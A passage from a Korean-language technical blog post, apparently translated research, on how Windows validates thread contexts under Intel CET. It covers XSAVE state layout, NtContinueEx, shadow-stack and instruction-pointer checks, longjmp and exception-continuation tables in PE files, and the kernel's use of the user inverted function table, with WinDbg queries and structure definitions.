읽고 XSAVE 영역에서 요청된 기능의 오프셋 및 크기를 저장한다.</li></ul></li><li>압축된 형식을 사용하는 경우 :<ul><li><code>XSAVE_AREA_HEADER</code> (<code>XCOMP_BV</code>에 해당)에서 <code>CompactionMask</code>를 읽고 요청된 기능이 포함되어 있는지 확인한다.</li><li><code>Configuration</code>-&gt; <code>AllFeatures</code>를 읽고 상태 비트가 요청된 기능 ID 앞에 오는 모든 활성화된 상태의 크기를 저장하고 이러한 크기를 더하여 요청된 형식의 오프셋을 계산한 뒤 각 이전 상태 영역의 시작 부분을 64byte로 정렬한다. 해당 비트가 <code>Configuration</code>-&gt; <code>AlignedFeatures</code>에 설정된 경우 마지막으로 필요한 경우 지정된 기능 ID에 대한 영역의 시작을 정렬한다.</li><li><code>Configuration.AllFeatures[n]</code>에서 요청된 기능의 크기를 읽는다.</li></ul></li><li>위에서 계산된 오프셋을 기반으로 XSAVE 영역에서 기능을 찾고 선택적으로 출력 길이 변수의 해당 크기와 함께 해당 크기에 대한 포인터를 반환한다.</li></ul><p>즉, 압축되지 않은 형식으로 특정 기능의 주소를 찾으려면 <code>SharedUserData</code>에서 프로세서에서 지원하는 기능을 확인하는 것으로 충분하다. 그러나 압축된 형식에서는 <code>SharedUserData</code>의 오프셋에 의존할 수 없으므로 스레드에서 활성화된 기능을 확인하고 이전 기능의 모든 크기를 기반으로 오프셋을 계산해야 한다.</p><p>일반적인 Win32 응용 프로그램에서는 내부적으로 위의 기본 API를 호출하지만 일부 사전 처리가 있는 다른 API가 사용되기도 한다. 상태 비트 0과 1은 CONTEXT_EX에서 XSAVE 영역의 일부로 저장되지 않으므로 Win32 API는 적절한 레거시 CONTEXT 필드 (즉, <code>XSTATE_LEGACY_FLOATING_POINT</code>의 경우 FltSave, <code>XSTATE_LEGACY_SSE</code>의 경우 Xmm0)에서 이러한 두 기능 비트를 가져와 처리한다.</p><pre><code class="hljs c">WINBASEAPIPVOIDWINAPILocateXStateFeature (    _In_ CONTEXT_EX Context,    _In_ DWORD FeatureId,    _Out_opt_ PDWORD Length);</code></pre><h2 id="예제-사용과-출력"><a href="#예제-사용과-출력" class="headerlink" title="예제 사용과 출력"></a>예제 사용과 출력</h2><p>CONTEXT_EX 데이터 구조와 결합된 경우 XState 내부를 이해하기 위해 간단한 <a href="https://github.com/yardenshafir/cet-research/tree/master/Xpolicy">테스트 프로그램</a>을 작성했다. 이 유틸리티는 일부 API 사용과 관련된 다양한 오프셋, 크기 및 동작을 보여준다. 다음은 AVX, MPX 및 Intel PT가 있는 시스템에서 프로그램 (AVX 레지스터 사용)의 출력이다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/5.png"></p><p>무엇보다도 레거시 CONTEXT가 음수인 오프셋에 있는 경우 예상대로 시스템이 x87 FPU 상태(1) 및 GSE 상태(2)를 지원하더라도 <code>XSAVEBV</code>에는 이러한 비트가 포함되어 있지 않으므로 레거시 콘텍스트 영역에 저장된다. (따라서 관련 상태 데이터의 음수 오프셋에 유의해야 함) <code>0x40</code> 바이트 크기인 XSAVE 헤더 (오프셋 <code>0x30</code>에서 시작) 다음에 AVX 상태(2)는 오프셋 <code>0x70</code>에서 시작한다.</p><h1 id="CONTEXT-EX-유효성-검사"><a href="#CONTEXT-EX-유효성-검사" class="headerlink" title="CONTEXT_EX 유효성 검사"></a>CONTEXT_EX 유효성 검사</h1><p>유저 모드 API는 결국 커널에 의해 처리되고 XSAVE 영역의 권한 있는 부분 (즉, CET 상태 데이터)을 수정하는 CONTEXT_EX를 구성할 수 있으므로 Windows는 CONTEXT_EX를 허용하는 API를 통한 바람직하지 않은 수정을 방지해야 한다. 예를 들어 :</p><ul><li><code>NtContinue</code> : 예외 후 재개하는 데 사용되며 longjmp CRT 기능을 처리하고 스택 해제를 수행한다.</li><li><code>NtRaiseException</code> : 기존 스레드에 예외를 삽입하는 데 사용됨</li><li><code>NtQueueUserApc</code> : 기존 스레드의 실행 흐름을 가로채는 데 사용됨</li><li><code>NtSetContextThread</code> : 기존 스레드의 프로세서 레지스터 / 상태를 수정하는 데 사용됨</li></ul><p>이러한 시스템 호출로 인해 커널이 <code>IA32_PL3_SSP</code> 또는 <code>IA32_CET_U</code> MSR을 수정하고 RIP를 조작할 수 있으므로 Windows는 전달된 CONTEXT_EX가 CET 보증을 위반하지 않는지 확인해야 한다.</p><p><code>19H1</code>에 SSP를 검증하고 <code>20H1</code>에 RIP 검증을 추가하는 방법을 곧 다룰 예정이다. 하지만 먼저 <code>NtContinue</code>의 오용 가능성을 줄이기 위해 작은 리팩터링을 수행해야 했다. 바로 <code>NtContinueEx</code> 함수의 도입이다.</p><h2 id="NtContinueEX-및-KCONTINUE-ARGUMENT"><a href="#NtContinueEX-및-KCONTINUE-ARGUMENT" class="headerlink" title="NtContinueEX 및 KCONTINUE_ARGUMENT"></a>NtContinueEX 및 KCONTINUE_ARGUMENT</h2><p>위에서 설명한 대로 <code>NtContinue</code>의 기능은 여러 상황에서 사용되며, CET가 프로세서 상태에 대한 임의 변경을 허용하는 API에서 기존 상태를 복원할 수 있으려면 인터페이스에 더 세밀한 제어가 추가되어야 했다. 이 작업은 <code>KCONTINUE_TYPE</code>이라는 새 enumeration의 생성을 통해 수행되었으며, <code>KCONTINUE_ARGUMENT</code> 데이터 구조에 현재 <code>NtContinue</code>에서 <code>NtContinueEx</code>로 향상된 버전으로 전달되어야 한다.</p><p>이 데이터 구조에는  <code>ContinueFlags</code> 필드가 추가되었다. 이 필드는  <code>NtContinue</code>의 원래 <code>TestAlert</code> 인수를 <code>CONTINUE_FLAG_RAISE_ALERT (0x1)</code> 플래그로 대체하는 동시에 새로운 TrapFrame으로 APC를 직접 전달하는<code>CONTINUE_FLAG_BYPASS_CONTEXT_COPY (0x2)</code> 플래그도 도입되었다. 이것은 CONTEXT 레코드 포인터가 사용자 스택의 특정 위치에 있는지 확인하여 이전에 구현된 최적화로, 함수가 사용자 모드 APC 전달의 일부로 사용되고 있다고 가정할 수 있다.  이 동작을 원하는 호출자는 <code>ContinueFlags</code>에서 플래그를 명시적으로 설정해야 한다.</p><p>이전 인터페이스는 레거시로 계속 지원되지만 내부적으로는 입력 매개 변수를 <code>KCONTINUE_ARGUMENT</code>가 아닌 <code>BOOLEAN TestAlert</code> 매개 변수로 인식하는 <code>NtContinueEx</code>를 호출한다. 이러한 경우는 새 인터페이스에서 <code>KCONTINUE_UNWIND</code>로 처리된다.</p><p>위 리팩터링의 일부로 다음 네 가지 가능한 유형이 있다.</p><ul><li><code>KCONTINUE_UNWIND</code> – 예외에서 해제할 때 사용되는 <code>RtlRestoreContext</code> 및 <code>LdrInitializeThunk</code>와 같은 <code>NtContinue</code>의 레거시 호출자가 사용</li><li><code>KCONTINUE_RESUME</code> – <code>NtContinueEx</code>를 다시 호출하기 전에 <code>KiUserApcDispatcher</code>가 실행할 유저 모드 스택에 <code>KCONTINUE_ARGUMENT</code> 구조를 빌드할 때 <code>KiInitializeUserApc</code>가 사용</li><li><code>KCONTINUE_LONGJUMP</code> – 예외 레코드의 예외 코드가 <code>STATUS_LONGJUMP</code> 인 경우 <code>RtlRestoreContext</code>에서 호출하는 <code>RtlContinueLongJump</code>에서 사용됨</li><li><code>KCONTINUE_SET</code> – <code>NtContinueEx</code>에 직접 전달되지 않고 <code>NtSetContextThread</code> API에 대한 응답으로 <code>PspGetSetContextInternal</code> 내에서 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>을 호출할 때 사용됨</li></ul><h2 id="SSP-Shadow-Stack-Pointer-유효성-검사"><a href="#SSP-Shadow-Stack-Pointer-유효성-검사" class="headerlink" title="SSP(Shadow Stack Pointer) 유효성 검사"></a>SSP(Shadow Stack Pointer) 유효성 검사</h2><p>앞서 언급했듯이 예외 해제, APC, longjmp 등과 같이 유저 모드 코드가 SSP를 변경해야 하는 경우가 있다. 그러나 운영 체제는 CET 우회 방지를 위해 SSP에 요청된 새 값을 검증해야 한다. 이는 <code>19H1</code>에서 새로운 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextXStateCetU.c">KeVerifyContextXStateCetU</a> 함수에 의해 구현되었다. 이 함수는 콘텍스트가 수정되는 스레드와 스레드의 새 콘텍스트를 수신하고 다음을 수행한다.</p><ul><li>CONTEXT_EX에 XState 데이터가 포함되어 있지 않거나 XState 데이터에 CET 레지스터가 포함되지 않은 경우 (<code>XSTATE_CET_U</code> 상태 비트로 <code>RtlLocateExtendedFeature2</code>를 호출하여 확인) 유효성 검사가 필요하지 않다.</li><li>대상 스레드에서 CET가 활성화된 경우 :<ul><li>호출자가 <code>XSAVEBV</code>에서 <code>XSTATE_MASK_CET_U</code>를 마스킹하여 이 스레드에서 CET를 비활성화하는지 확인한다. 이 경우 함수는 상태 비트를 다시 활성화하고 <code>MSR_IA32_CET_SHSTK_EN</code> (CET의 섀도우 스택 기능을 활성화하는 플래그)을 <code>Ia32CetUMsr</code>에 설정하고 현재 섀도우 스택을 <code>Ia32Pl3SspMsr</code>로 설정한다.</li><li>반면에 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextXStateCetUEnabled.c">KiVerifyContextXStateCetUEnabled</a>를 호출하면 CET 섀도우 스택이 활성화되었는지, (<code>MSR_IA32_CET_SHSTK_EN</code> 활성화 여부) 새 SSP가 8byte로 정렬되었는지, 현재 SSP 값과 섀도우 스택 영역의 VAD 끝 사이에 있는지 확인한다. 스택이 거꾸로 성장하기 때문에 영역의 “끝”이 실제로 스택의 시작 주소이다. 따라서 스레드에 대한 새 콘텍스트를 설정할 때 모든 SSP 값은 스레드에서 지금까지 사용된 섀도우 스택 내에 있는 한 유효하다. 또한 스레드가 섀도우 스택 내부로 이동할 수 있는 범위에는 제한이 없다.</li></ul></li><li>CET가 대상 스레드에서 비활성화되고 호출자가 CONTEXT_EX의 <code>XSAVEBV</code>에 <code>XSTATE_CET_U</code> 마스크를 포함하여 활성화를 시도하는 경우 두 MSR 값이 모두 0으로 설정되도록 허용한다. (섀도우 스택 X, SSP X)</li></ul><p>위 유효성 검사에 실패하면 <code>STATUS_SET_CONTEXT_DENIED</code>가 반환되고 성공하면 <code>STATUS_SUCCESS</code>가 반환된다.</p><p>CET를 활성화하면 기존 Windows 8.1에서 CFG와 함께 구현된 Check Stack Extents도 암시적으로 활성화된다. 이것은 KPROCESS의 <code>ProcessFlags</code> 필드에 있는 <code>CheckStackExtents</code> 비트를 통해 확인할 수 있다. 즉, 대상 SSP가 유효성을 검사할 때마다 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextRecord.c">KeVerifyContextRecord</a> 또한 호출되고 대상 RSP가 현재 스레드의 TEB 사용자 스택 제한 (또는 이것이 WOW64 프로세스인 경우 TEB32의 사용자 스택 제한)의 일부인지 확인한다. <code>RtlGuardIsValidStackPointer</code> (및 <code>RtlGuardIsValidWow64StackPointer</code>)에 의해 구현된 이러한 검사는 이전에 <a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d">Tenable</a> 및 <a href="https://blog.ensilo.com/atombombing-cfg-protected-processes">enSilo</a>의 연구원에 의해 문서화되었다.</p><h2 id="RIP-Instruction-Pointer-유효성-검사"><a href="#RIP-Instruction-Pointer-유효성-검사" class="headerlink" title="RIP(Instruction Pointer) 유효성 검사"></a>RIP(Instruction Pointer) 유효성 검사</h2><p><code>19030</code> 빌드 버전에 Intel CET를 사용하는 또 다른 기능인 호출자가 프로세스에 대해 설정하려는 새 RIP가 유효한지 확인하는 기능이 추가되었다. SSP 유효성 검사와 마찬가지로 이는 스레드에 대해 CET이 활성화된 경우에만 적용된다. 그러나 RIP 유효성 검사는 기본적으로 활성화되어 있지 않으며 프로세스에 대해 활성화되어야 한다. (EPROCESS의 <code>MitigationFlags2Values</code> 필드에 있는 <code>UserCetSetContextIpValidation</code> 비트로 표시됨).</p><p>즉, 현재 빌드의 경우 <code>CreateProcess</code>를 호출하고 <code>PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</code> 속성을 사용할 때 <code>PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_ON</code> 플래그가 활성화되면 옵션이 설정되는 것으로 보인다. (CET는 프로세스 생성 시에만 활성화될 수 있으므로 <code>ProcessUserShadowStackPolicy</code> 값으로 <code>SetProcessMitgationPolicy</code> API를 호출하는 것은 유효하지 않다.)</p><p>그러나 흥미롭게도 새로운 mitigation 옵션인 <code>PS_MITIGATION_OPTION_USER_CET_SET_CONTEXT_IP_VALIDATION (32)</code> 이 mitigation map에 추가되었다. 문서화되지 않은 이 mitigation을 토글 하면 <code>MitigationFlags2Values</code> 필드에서 <code>AuditUserCetSetContextIpValidation</code> 비트를 활성화한다. 또한 이것은 이제 32 번째 mitigation 옵션 (각각 DEFERRED / OFF / ON / RESERVED에 대해 4 비트를 차지함)이므로 132개의 mitigation 비트가 필요하며 <code>PS_MITIGATION_OPTIONS_MAP</code>는 Map 필드의 3개의 64 비트 배열 요소로 확장되었다.  (<code>PS_SYSTEM_DLL_INIT_BLOCK</code>의 크기에 대한 후속 효과가 있음)</p><p>새로운 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a> 함수는 스레드의 콘텍스트가 변경될 때마다 호출된다. 스레드에 대해 CET 및 RIP mitigation이 모두 활성화되어 있는지 확인하고 콘텍스트 매개 변수에 <code>CONTEXT_CONTROL</code> 플래그가 설정되어 있는지 확인한다. 즉, 이 새 콘텍스트에 의해 RIP가 변경됨을 의미한다. 모든 검사가 통과되면 내부 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextIpForUserCet.c">KiVerifyContextIpForUserCet</a> 함수를 호출한다. 이 함수의 목적은 대상 RIP가 유효한 값이고 익스플로잇이 임의 코드를 실행하는 데 사용하는 값이 아닌지 확인하는 것이다.</p><p>먼저 대상 RIP 주소가 커널 주소가 아니며 매핑되어서는 안 되는 하위 0x10000 바이트의 주소가 아닌지 확인한다. 그런 다음 대상 RIP가 유저 모드의 이전 주소인 경우를 허용하기 위해서 해당 기본 트랩 프레임을 검색하고 대상 RIP가 해당 트랩 프레임의 RIP인지 확인한다. 일반적으로 스레드에 대해 <code>NtSetThreadContext</code>가 처음 호출되고 RIP가 스레드의 초기 시작 주소로 설정될 때 발생하지만 일반적이지 않은 다른 경우에도 발생할 수 있다.</p><p>이 함수는 <code>KCONTINUE_TYPE</code>을 수신하고 해당 값에 따라 다양한 방식으로 대상 RIP를 처리한다. 대부분의 경우 섀도우 스택을 반복하고 대상 RIP를 검색하는데, 찾지 못하면 예외가 발생하며 예외 핸들러에 도달할 때까지 계속 실행된다. 예외 핸들러는 제공된 <code>KCONTINUE_TYPE</code>이 <code>KCONTINUE_UNWIND</code>인지 확인하고 <code>KCONTINUE_UNWIND</code> 플래그와 함께 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/RtlVerifyUserUnwindTarget.c">RtlVerifyUserUnwindTarget</a>을 호출하는지 확인한다. 이 기능은 다음 섹션에서 설명하는 더 복잡한 검사를 사용하여 RIP를 다시 확인한다.</p><p>다른 경우에는 <code>STATUS_SET_CONTEXT_DENIED</code>를 반환하여 EPROCESS에 <code>AuditUserCetSetContextIpValidation</code> 플래그가 설정된 경우 실패 검사를 위해 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>이 <code>KiLogUserCetSetContextIpValidationAudit</code>함수를 호출한다. 이 검사(auditing)는 일반적인 프로세스 mitigation ETW 채널을 통해 수행되는 대신 WER (Windows 오류보고) 서비스를 통해 빠른 실패 예외를 직접 발생시키는 방식으로 수행된다. (<code>FAST_FAIL_SET_CONTEXT_DENIED</code>로 설정된 정보로 <code>0xC000409</code> 예외를 전송). WER 스팸을 방지하기 위해 <code>AuditUserCetSetContextIpValidationLogged</code>라는 또 다른 EPROCESS 비트가 사용된다.</p><p>스레드가 종료되고 현재 섀도우 스택 주소가 페이지로 정렬된 경우 함수가 대상 RIP를 찾기 전에 섀도우 스택에 대한 루프를 중지하는 경우가 있다. 즉, 스레드를 종료할 때 함수는 최우선적으로 섀도우 스택의 현재 페이지에서만 대상 RIP를 확인한다. 해당 페이지에서 대상 RIP를 찾지 못하면 <code>STATUS_THREAD_IS_TERMINATING</code>을 반환한다.</p><p>함수는 <code>KCONTINUE_TYPE</code> 이 <code>KCONTINUE_LONGJUMP</code> 인 경우 대상 RIP가 섀도우 스택에 대해 검증되지 않지만 대신 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/RtlVerifyUserUnwindTarget.c">RtlVerifyUserUnwindTarget</a>이 <code>KCONTINUE_LONGJUMP</code> 플래그와 함께 호출되어 PE Image Load Configuration Directory의 <code>longjmp</code> 테이블에서 RIP를 확인한다. 이 글의 다음 섹션에서 이 표와 검사에 대해 설명한다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/6.png"></p><p><a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>은 다음 두 함수 중 하나에 의해 호출된다.</p><ul><li><code>PspGetSetContextInternal</code> – <code>NtSetContextThread API</code>에 대한 응답으로 호출된다</li><li><a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextRecord.c">KiVerifyContextRecord</a> – <code>NtContinueEx</code>, <code>NtRaiseException</code> 및 일부 경우 <code>NtSetContextThread</code> API에 대한 응답으로 호출된다. <a href="%3Chttps://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>을 호출하기 전에 (수신된 <code>ContinueArgument</code>가 NULL이 아닌 경우에만)이 함수는 호출자가 CS 레지스터를 수정하려고 하는지, 새 값이 유효한 값인지를 확인한다. WOW64가 아닌 프로세스는 피코 프로세스이며, 이 경우 CS를 <code>KGDT64_R3_CODE</code> 또는 <code>KGDT64_R3_CMCODE</code>로 설정할 수 있다. 다른 값은 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextRecord.c">KiVerifyContextRecord</a>가 새 CS 값을 <code>KGDT64_R3_CODE</code>로 강제한다. <code>KiVerifyContextRecord</code>는 <code>KiContinuePreviousModeUser</code> 또는 <code>KeVerifyContextRecord</code>에 의해 호출되며 두 번째의 경우, 함수는 RSP가 프로세스 스택 (native 또는 wow64) 중 하나에 있고 64 비트 프로세스가 CS를 <code>KGDT64_R3_CODE</code>로만 설정하는지 확인한다.</li></ul><p><code>KeVerifyContextIpForUserCet</code>을 호출하여 대상 RIP의 유효성을 검사하는 모든 경로는 먼저 <code>KeVerifyContextXStateCetU</code>를 호출하여 대상 SSP의 유효성을 검사하고 SSP가 유효할 때만 RIP 검사를 수행한다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/7.png"></p><h1 id="예외-해제-및-longjmp-유효성-검사"><a href="#예외-해제-및-longjmp-유효성-검사" class="headerlink" title="예외 해제 및 longjmp 유효성 검사"></a>예외 해제 및 longjmp 유효성 검사</h1><p>위에서 설명한 대로 <code>KCONTEXT_SET</code> 및 <code>KCONTEXT_RESUME</code>에 대한 처리는 대상 RIP가 섀도우 스택의 일부인지 확인하는 것과 관련이 있지만 <code>KCONTEXT_UNWIND</code> 및 <code>KCONTEXT_LONGJMP</code> 경우에는 <code>RtlVerifyUserUnwindTarget</code>을 통한 확장된 유효성 검사가 필요하다. 이 두 번째 유효성 검사를 위해서는 PE 파일 형식 (및 컴파일러 지원)을 변경해야 하며 JIT 컴파일러 지원을 위해 <a href="https://github.com/yardenshafir/cet-research/blob/master/src/NtSetInformationProcess.c">NtSetInformationProcess</a>에 추가된 새로운 OS 수준의 정보 클래스가 포함되어 있다.</p><p>CFG (Control Flow Guard) 지원으로 인해 이미 추가된 PE 파일 내부의 <code>Image Load Configuration Directory</code>에는 현재 설정된 <code>jmp/longjmp</code> 쌍의 일부로 사용되는 분기 유효 대상에 대한 정보가 포함되어 있으며, 이 정보를 컴파일러가 식별해 링커에 전달하도록 되어 있다. CET를 사용하면 이 기존 데이터가 재사용되지만 연속 예외 핸들러 지원을 위해 또 다른 테이블과 크기가 추가된다. Visual Studio 2017은 <code>longjmp</code> 테이블을 생성하지만 Visual Studio 2019부터 위와 같은 정보가 포함된 테이블을 생성한다.</p><p>이 마지막 섹션에서는 이러한 테이블의 형식과 커널이 마지막 두 가지 유형의 <code>KCONTINUE_TYPE</code> 제어 흐름을 검증하는 방법을 살펴보겠다.</p><h2 id="PE-메타-데이터-테이블"><a href="#PE-메타-데이터-테이블" class="headerlink" title="PE 메타 데이터 테이블"></a>PE 메타 데이터 테이블</h2><p>Windows 10은 Control Flow Guard 이미지에 있는 표준 GFIDS 테이블 외에도  RVA가 저장되는 <code>.gljmp</code>라는 PE Image Load Configuration의 <code>Guard Long Jump Target Table</code> 필드에 저장된 PE 섹션의 Long Jump Target Table을 포함하여 longjump 대상의 유효성 검사에 대한 지원을 추가했다.</p><p><code>setjmp</code>에 대한 호출이 코드에서 수행될 때마다 반환 주소 (longjmp가 분기되는 위치)의 RVA가 이 테이블에 추가된다. 이 테이블의 존재 여부는 Image Load Configuration Directory의 <code>GuardFlags</code>에 있는 <code>IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT</code> 플래그에 의해 결정되며 <code>GuardLongJumpTargetCount</code> 필드에 표시된 만큼의 항목을 포함한다.</p><p>각 항목은 4 바이트 RVA와 n 바이트의 메타 데이터이다. 여기서 n은 <code>(GuardFlags &amp; IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK) &gt;&gt; IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_SHIFT</code>의 결과에서 가져온다. 이 테이블의 경우 메타 데이터가 정의되지 않았으므로 메타 데이터 바이트는 항상 0이 될 것으로 예상된다. 이 계산은 <code>GFIDS</code> 테이블 (<code>export suppression</code>가 활성화된 경우 잠재적으로 메타 데이터가 있음)에 사용된 계산과 동일하기 때문에 하나 이상의 CFG 대상을 억제하면 1 바이트의 빈 메타데이터가 Long Jump Target Target Table의 모든 항목에 추가된다.</p><p>예를 들어 다음은 두 개의 <code>longjmp</code> 대상이 있는 PE 파일이다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/8.png"></p><p>이 이미지도 CFG 내보내기 억제를 사용하므로 <code>GuardFlags</code>의 상위 니블 (<code>IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK</code>에 해당)에 있는 값 1에 유의하자. 이는 아래에서 볼 수 있는 Long Jump Target Table에 1 바이트의 추가 메타 데이터가 있음을 알려준다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/9.png"></p><p><code>Windows 10 20H1</code>에서 이러한 유형의 메타 데이터는 연속 대상에 대한 예외 핸들러가 바이너리의 제어 흐름의 일부로 존재하는 경우에 포함된다. 두 개의 새로운 필드 <code>GuardEHContinuationTable</code> 및 <code>GuardEHContinuationCount</code>가 Image Load Configuration Directory 끝에 추가되고 <code>IMAGE_GUARD_EH_CONTINUATION_TABLE_PRESENT</code> 플래그가 <code>GuardFlags</code>에 포함된다. 이 테이블의 레이아웃은 <code>GuardFlags</code>의 상위 니블을 기반으로 한 메타 데이터 바이트 추가를 포함하여 Long Jump Target Table에 대해 표시된 것과 동일하다.</p><p>안타깝게도 Visual Studio 2019 버전에서도 이 데이터를 생성하지 않으므로 현재 예제를 보여줄 수 없다. 이 분석은 나중에 설명하는 유효성 검사 코드와 20H1 SDK의 <code>Ntimage.h</code> 헤더 파일을 리버스 엔지니어링 한 기반으로 한다.</p><h2 id="사용자-반전-기능-테이블"><a href="#사용자-반전-기능-테이블" class="headerlink" title="사용자 반전 기능 테이블"></a>사용자 반전 기능 테이블</h2><p>이제 longjmp 대상 또는 연속 대상에 대한 예외 핸들러로 분기하기 위해 제어 흐름 변경이 발생할 수 있음을 알고 있으므로 CONTEXT_EX에 있는 RIP 주소를 기반으로 이 두 테이블을 어떻게 얻을 수 있을까? NtContinueEx 전화? 이런 작업은 특정 프로그램 실행에서 자주 발생할 수 있으므로 커널은 이 문제를 해결하기 위한 효율적인 방법이 필요하다.</p><p><code>Inverted Function Table</code>의 개념에 이미 익숙할 것이다. 이러한 테이블은 <code>Ntdll.dll (LdrpInvertedFunctionTable)</code> 에서 유저 모드 예외 처리 중 해제 opcode 및 예외 데이터를 찾는 데 사용된다. (<code>.pdata</code> 섹션을 찾아서) <code>Ntoskrnl.exe (PsInvertedFunctionTable)</code>에 또 다른 테이블이 있으며 커널 모드 예외 처리 및 PatchGuard 검사의 일부에 사용된다.</p><p>간단히 말해 <code>Inverted Function Table</code>은 로드된 모든 유저/커널 모듈 크기와 가상 주소별로 정렬된 PE 예외 디렉터리에 대한 포인터를 포함하는 배열이다. 이 배열을 검색하는 것이 PE 헤더를 구문 분석한 뒤 로드된 모듈 연결 목록을 검색하는 것보다 훨씬 빠르기 때문에 역함수 테이블의 binary search는 로그(n) 조회에서만 해당 모듈의 가상 주소를 빠르게 찾는다. 현재 Microsoft의 명성을 얻고 있는 Ken Johnson과 Matt Miller는 이전에 Uninformed Magazine에 <a href="http://uninformed.org/index.cgi?v=8&a=2&p=20">커널 모드 후킹 기술</a>에 대한 기사의 일부로 개요를 게시했다.</p><p>그러나 이전에는 <code>Ntdll.dll</code>은 테이블에서 유저 모드 예외만, <code>Ntoskrnl.exe</code>는 커널 모드 예외만 검사했다. <code>20H1</code>의 변경 사항은 커널도 사용자 테이블을 검사해야 한다는 것이다. <code>longjmp</code> 및 예외 연속을 처리하는 데 필요한 새로운 로직을 지원하기 위해 새로운 <code>RtlpLookupUserFunctionTableInverted</code> 함수가 추가되어 <code>KeUserInvertedFunctionTable</code> 변수를 스캔하고 <code>Ntdll.dll</code>에서 현재 내보낸 <code>LdrpInvertedFunctionTable</code> 심볼에 매핑된다.</p><p>이것은 흥미로운 포렌식 기능으로, 커널에서 PEB의 로더 데이터를 구문 분석하거나 VAD를 열거할 필요 없이 현재 프로세스 내에 로드된 유저 모드 모듈을 쉽게 찾을 수 있다. 예를 들어 다음은 <code>Csrss.exe</code>에서 현재 로드된 이미지를 보는 방법이다.</p><pre><code class="hljs c">dx @$cursession.Processes.Where(p =&gt; p.Name == <span class="hljs-string">&quot;csrss.exe&quot;</span>).First().SwitchTo()dx -r0 @$table = *(nt!_INVERTED_FUNCTION_TABLE**)&amp;nt!KeUserInvertedFunctionTabledx -g @$table-&gt;TableEntry.Take(@$table-&gt;CurrentSize)</code></pre><p>즉, 원격에서도 특히 <code>unwind opcode</code> 가없는 x86 시스템에서는 이미지가 예외 디렉터리를 포함되지 않을 가능성이 있으며, <code>.pdata</code>는 <code>/SAFESEH</code>를 사용하고 적어도 하나의 예외 핸들러가 있는 경우에만 생성된다.</p><p>이러한 상황에서는 <code>RtlpLookupUserFunctionTableInverted</code>가 실패할 수 있으며 대신 <code>MmGetImageBase</code>를 사용해야 한다. 이것은 입력 RIP에 해당하는 영역을 매핑하는 VAD를 조회하고 이미지 VAD 인 경우 해당 영역의 기본 주소와 크기 (모듈의 크기와 일치해야 함)를 반환한다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/10.png"></p><h2 id="연속된-대상에-대한-동적-예외-핸들러"><a href="#연속된-대상에-대한-동적-예외-핸들러" class="headerlink" title="연속된 대상에 대한 동적 예외 핸들러"></a>연속된 대상에 대한 동적 예외 핸들러</h2><p><code>KCONTINUE_UNWIND</code> 요청을 처리하는데 마지막 장애물이 하나 있다. 정규 프로세스에는 코드의 <code>__try /__except /__finally</code> 절을 기반으로 하는 연속된 대상에 대한 정적 예외 핸들러가 있지만 Windows에서는 JIT 엔진이 실행 가능한 코드를 동적으로 즉시 생성할 수 있을 뿐만 아니라 <code>RtlAddFunctionTable</code> API 등을 통해 런타임에 예외 핸들러를 등록하고 opcode를 해제할 수 있다. 이러한 예외 핸들러는 이전에는 사용자 모드 stack walking 및 예외 해제에만 필요했지만 이제는 연속 핸들러가 커널이 RIP에 대해 잠재적으로 유효한 값으로 처리해야 하는 제어 흐름 대상이 된다. <code>RtlpFindDynamicEHContinuationTarget</code>이 처리하는 것이 마지막 가능성이다.</p><p>CET 지원 및 <code>NtContinueEx</code> 도입의 일부로 EPROCESS 구조는 <code>DynamicEHContinuationTargetsLock</code> 및 <code>DynamicEHContinuationTargetsTree</code>라는 두 개의 새로운 필드로 향상되었다. 첫 번째는 <code>EX_PUSH_LOCK</code>이고 두 번째는 모든 유효한 예외 핸들러 주소를 포함하는 <code>RTL_RB_TREE</code>이다. 이 트리는 <code>PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION</code> 유형의 데이터 구조와 함께 새로운 프로세스 정보 클래스 인 <code>ProcessDynamicEHContinuationTargets</code>를 사용하여 <code>NtSetInformationProcess</code>에 대한 호출을 통해 관리된다. 더 쉽게 이해하려면 이러한 구조 및 플래그에 대한 아래 정의를 참조하면 된다.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DYNAMIC_EH_CONTINUATION_TARGET_ADD          0x01</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DYNAMIC_EH_CONTINUATION_TARGET_PROCESSED    0x02</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PROCESS_DYNAMIC_EH_CONTINUATION_TARGET</span></span><span class="hljs-class">&#123;</span>     ULONG_PTR TargetAddress;    ULONGLONG Flags;&#125; PROCESS_DYNAMIC_EH_CONTINUATION_TARGET, *PPROCESS_DYNAMIC_EH_CONTINUATION_TARGET;<span 